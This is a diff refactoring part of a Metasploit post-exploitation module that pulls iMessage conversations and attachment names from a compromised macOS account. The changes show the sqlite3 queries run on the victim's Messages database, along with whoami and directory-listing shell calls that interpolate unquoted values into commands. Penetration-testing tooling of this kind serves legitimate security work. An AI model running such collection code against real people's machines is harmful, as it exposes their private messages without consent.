@@ -3,9 +3,9 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-require 'rex'
-require 'msf/core/auxiliary/report'
+#require 'msf/core'
+#require 'rex'
+#require 'msf/core/auxiliary/report'
 
 class MetasploitModule < Msf::Post
 
@@ -59,17 +59,20 @@ class MetasploitModule < Msf::Post
   #
   def readable(messages_path)
     print_status("#{peer} - Generating readable format")
-    sql  = 'SELECT datetime(m.date + strftime("%s", "2001-01-01 00:00:00"), "unixepoch", "localtime")  || " " || '
-    sql += 'case when m.is_from_me = 1 then "SENT" else "RECV" end || " " || '
-    sql += 'usr.id || ": " || m.text, a.filename '
-    sql += 'FROM chat as c '
-    sql += 'INNER JOIN chat_message_join AS cm ON cm.chat_id = c.ROWID '
-    sql += 'INNER JOIN message AS m ON m.ROWID = cm.message_id '
-    sql += 'LEFT JOIN message_attachment_join AS ma ON ma.message_id = m.ROWID '
-    sql += 'LEFT JOIN attachment as a ON a.ROWID = ma.attachment_id '
-    sql += 'INNER JOIN handle usr ON m.handle_id = usr.ROWID '
-    sql += 'ORDER BY m.date;'
-    readable_data = exec("sqlite3 #{messages_path} '#{sql}'")
+    sql = [
+      'SELECT datetime(m.date + strftime("%s", "2001-01-01 00:00:00"), "unixepoch", "localtime")  || " " ||',
+      'case when m.is_from_me = 1 then "SENT" else "RECV" end || " " ||',
+      'usr.id || ": " || m.text, a.filename',
+      'FROM chat as c',
+      'INNER JOIN chat_message_join AS cm ON cm.chat_id = c.ROWID',
+      'INNER JOIN message AS m ON m.ROWID = cm.message_id',
+      'LEFT JOIN message_attachment_join AS ma ON ma.message_id = m.ROWID',
+      'LEFT JOIN attachment as a ON a.ROWID = ma.attachment_id',
+      'INNER JOIN handle usr ON m.handle_id = usr.ROWID',
+      'ORDER BY m.date;'
+    ]
+    sql = sql.join(' ')
+    readable_data = exec_shell_cmd("sqlite3 #{messages_path} '#{sql}'")
     {filename: 'messages.txt', mime: 'text/plain', data: readable_data}
   end
 
@@ -78,17 +81,20 @@ class MetasploitModule < Msf::Post
   #
   def latest(messages_path)
     print_status("#{peer} - Retrieving latest messages")
-    sql  = 'SELECT datetime(m.date + strftime("%s", "2001-01-01 00:00:00"), "unixepoch", "localtime")  || " " || '
-    sql += 'case when m.is_from_me = 1 then "SENT" else "RECV" end || " " || '
-    sql += 'usr.id || ": " || m.text, a.filename '
-    sql += 'FROM chat as c '
-    sql += 'INNER JOIN chat_message_join AS cm ON cm.chat_id = c.ROWID '
-    sql += 'INNER JOIN message AS m ON m.ROWID = cm.message_id '
-    sql += 'LEFT JOIN message_attachment_join AS ma ON ma.message_id = m.ROWID '
-    sql += 'LEFT JOIN attachment as a ON a.ROWID = ma.attachment_id '
-    sql += 'INNER JOIN handle usr ON m.handle_id = usr.ROWID '
-    sql += "ORDER BY m.date DESC LIMIT #{datastore['MSGCOUNT']};"
-    latest_data = exec("sqlite3 #{messages_path} '#{sql}'")
+    sql = [
+      'SELECT datetime(m.date + strftime("%s", "2001-01-01 00:00:00"), "unixepoch", "localtime")  || " " ||',
+      'case when m.is_from_me = 1 then "SENT" else "RECV" end || " " ||',
+      'usr.id || ": " || m.text, a.filename',
+      'FROM chat as c',
+      'INNER JOIN chat_message_join AS cm ON cm.chat_id = c.ROWID',
+      'INNER JOIN message AS m ON m.ROWID = cm.message_id',
+      'LEFT JOIN message_attachment_join AS ma ON ma.message_id = m.ROWID',
+      'LEFT JOIN attachment as a ON a.ROWID = ma.attachment_id',
+      'INNER JOIN handle usr ON m.handle_id = usr.ROWID',
+      "ORDER BY m.date DESC LIMIT #{datastore['MSGCOUNT']};"
+    ]
+    sql = sql.join(' ')
+    latest_data = exec_shell_cmd("sqlite3 #{messages_path} '#{sql}'")
     print_good("#{peer} - Latest messages: \n#{latest_data}")
     {filename: 'latest.txt', mime: 'text/plain', data: latest_data}
   end
@@ -115,7 +121,7 @@ class MetasploitModule < Msf::Post
   #
   def dir(path)
     results = []
-    subdirs = exec("ls -l #{path}")
+    subdirs = exec_shell_cmd("ls -l #{path}")
 
     unless subdirs =~ /No such file or directory/
       results = subdirs.scan(/[A-Z][a-z][a-z]\x20+\d+\x20[\d\:]+\x20(.+)$/).flatten
@@ -128,7 +134,7 @@ class MetasploitModule < Msf::Post
   # This is just a wrapper for cmd_exec(), except it chomp() the output,
   # and retry under certain conditions.
   #
-  def exec(cmd)
+  def exec_shell_cmd(cmd)
     begin
       out = cmd_exec(cmd).chomp
     rescue ::Timeout::Error => e
@@ -155,7 +161,7 @@ class MetasploitModule < Msf::Post
 
   def run
     if datastore['USER'] == 'CURRENT'
-      user = exec("/usr/bin/whoami")
+      user = exec_shell_cmd("/usr/bin/whoami")
     else
       user = datastore['USER']
     end
